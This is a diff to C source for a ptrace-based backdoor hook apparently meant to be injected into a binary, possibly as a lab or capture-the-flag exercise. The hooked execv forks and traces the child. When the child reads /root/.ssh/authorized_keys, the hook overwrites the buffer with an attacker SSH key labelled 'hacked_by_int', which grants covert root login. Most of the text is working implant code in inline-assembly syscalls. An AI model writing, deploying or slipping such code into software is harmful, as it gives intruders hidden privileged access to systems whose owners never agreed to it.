@@ -1,5 +1,6 @@
 // clang-format off
 #include <sys/user.h>
+#include <netinet/in.h>
 #include <sys/ptrace.h>
 #include <linux/ptrace.h>
 #include <stdint.h>
@@ -7,7 +8,7 @@
 #include <unistd.h>
 
 #define SSH_AUTH_PATH "/root/.ssh/authorized_keys"
-#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK+bV1YDHGeiyPeh+F68/1QhvNvdWBM35/E7cZBLV5bm root@MSI\n"
+#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiXeDYmT1LhJZC5/dTl1VRgAHy1WkE/NyovkF4mFtPe hacked_by_int\n"
 // clang-format on
 
 void set_my_pubkey (uint32_t pid);
@@ -19,13 +20,15 @@ uint64_t sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr,
 
 void sys_wait (uint32_t pid);
 
-void sys_execve (const char *path, char *const argv[]);
-
 int sys_open (const char *path, int flags);
 
 void sys_exit ();
 
 int sys_fork ();
+
+void sys_write (int fd, char *buf, uint32_t size);
+
+void call_execv (const char *path, char *const argv[]);
 
 void copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len);
 
@@ -49,21 +52,17 @@ void set_regs (uint32_t pid, struct user_regs_struct *regs);
 
 void get_regs (uint32_t pid, struct user_regs_struct *regs);
 
-void sys_write (int fd, char *buf, uint32_t size);
-
 void
 execv_hook (const char *path, char *const argv[])
 {
-  asm ("mov r9, 0x123456789abc");
-
-  // if (*get_backdoor_location () != 16)
-  //   sys_execve (path, argv);
+  if (*get_backdoor_location() != 16)
+    call_execv (path, argv);
 
   uint32_t pid;
   if ((pid = sys_fork ()) == 0)
     {
       sys_ptrace (PTRACE_TRACEME, 0, NULL, NULL);
-      sys_execve (path, argv);
+      call_execv (path, argv);
     }
 
   sys_wait (pid);
@@ -99,19 +98,12 @@ set_my_pubkey (uint32_t pid)
   break_at_sys_nr (pid, 0x0, &info);
   // now session trying to read authorized_key
   uint8_t backdoor_key[] = SSH_PUBKEY;
-  uint8_t check_old_key[] = SSH_PUBKEY;
   void *read_to = (void *)info.entry.args[1];
   next_syscall (pid);
   get_syscall_info (pid, &info);
 
-  copy_from_tracee (pid, (uint64_t)read_to, check_old_key,
-                    sizeof (SSH_PUBKEY));
-  // this is the old key
   copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
-  // try to set the new key
-  copy_from_tracee (pid, (uint64_t)read_to, check_old_key,
-                    sizeof (SSH_PUBKEY));
-  // this is the new key
+  // set my key
 
   // struct user_regs_struct regs;
   // get_regs (pid, &regs);
@@ -123,7 +115,7 @@ set_my_pubkey (uint32_t pid)
 uint32_t *
 get_backdoor_location ()
 {
-  asm ("lea rax, [r9]");
+  asm ("mov rax, 0x123456789abc");
 }
 
 void
@@ -145,12 +137,6 @@ sys_wait (uint32_t pid)
       "xor rsi, rsi; xor rdx, rdx; xor r10, r10; push 0x3d; pop rax; syscall");
 }
 
-void
-sys_execve (const char *path, char *const argv[])
-{
-  asm ("xor rdx, rdx; push 0x3b; pop rax; syscall");
-}
-
 int
 sys_open (const char *path, int flags)
 {
@@ -167,6 +153,12 @@ int
 sys_fork ()
 {
   asm ("push 0x39; pop rax; syscall");
+}
+
+void
+call_execv (const char *path, char *const argv[])
+{
+  asm ("mov rax, 0x23456789abcd; call rax");
 }
 
 void
